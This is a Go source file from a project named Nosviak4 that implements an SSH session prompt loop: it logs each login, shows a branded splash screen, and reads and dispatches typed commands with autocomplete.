package masters

import (
	"Nosviak4/modules/gologr"
	"Nosviak4/source/masters/commands"
	"Nosviak4/source/masters/commands/autocomplete"
	"Nosviak4/source/masters/sessions"
	"context"
	"strings"
)

// Prompt will handle all the incoming commands within the reader
func prompt(session *sessions.Session) error {
	session.Terminal.Logger().WriteLog(gologr.DEFAULT, "[SSH-CONN] ssh login confirmed for %s from %s [%s]", session.User.Username, session.ConnIP(), string(session.Terminal.Conn.ClientVersion()))

	/* defines our reader */
	session.Reader = session.Terminal.NewRead(">")
	defer func(s *sessions.Session) {
		defer delete(sessions.Sessions, session.Opened)
		session.Terminal.Channel.Close()
	}(session)

	/* executes the home splash branding */
	err := session.ExecuteBranding(make(map[string]any), "home_splash.tfx")
	if err != nil {
		return err
	}

	width, height, err := session.Terminal.RequestCursorSize(); 
	if err != nil || width > int(session.Terminal.X) || height > int(session.Terminal.Y) {
		return err
	}

	for {
		session.Reader.Prompt, err = session.ExecuteBrandingToString(make(map[string]any), "prompt.tfx")
		if err != nil {
			return err
		}

		session.Reader.KeyPressFunc = commands.ROOT.CallbackKeypress(session)
		session.Reader.AutoCompleter = autocomplete.NewUnixAutoCompleter(session)
		session.Reader.Context, session.Cancel = context.WithCancel(context.Background())
		text, err := session.Reader.ReadLine()
		if err != nil {
			return err
		}

		if err := commands.ROOT.Execute(session, strings.Split(string(text), " ")); err != nil {
			return err
		}
	}
}
